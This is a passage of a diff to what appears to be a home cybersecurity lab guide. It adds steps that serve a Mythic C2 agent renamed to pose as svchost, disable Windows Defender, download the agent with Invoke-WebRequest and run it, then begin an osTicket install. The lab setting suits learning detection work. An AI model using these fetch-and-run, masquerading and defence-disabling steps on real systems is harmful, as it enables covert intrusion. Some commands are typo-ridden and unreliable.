@@ -84,4 +84,5 @@ Configuration Management Tools: To automate the deployment and configuration of 
 ![Mythic active callback](https://github.com/user-attachments/assets/114ebab0-2ff4-48ed-b5c6-09cbe672254b)<br>
 *Ref 21: Mythic active callback*<br>
 15. In the Mythic VM cd into home directory > wget <link address>; change 8443 to 744. and ip to the mythic vm ip nad --no-check-certificate > mv <file> svchost-<make a filename>.exe < python3 -m http.server 9999
-16. 
+16. Disable Windows Defender on the Windows Server and add an exclusion for the Downloads Folder. In PowerShell invoke-webrequest -uri http://<mythic vm ip address>:9999/svchost-<filename>.exe -Outfile "(:\Users\Administrator\Downloads\svchost-<filename>.exe" > run the file thats in downloads.
+17. Spin up your osTicket VM. Download <a href="https://www.apachefriends.org/download.html">xampp</a> by apache and <a href="https://osticket.com/">osTicket</a>. Click on xampp to install it. Extract all of the osTicket download after you extract the osticket zip in that folder.
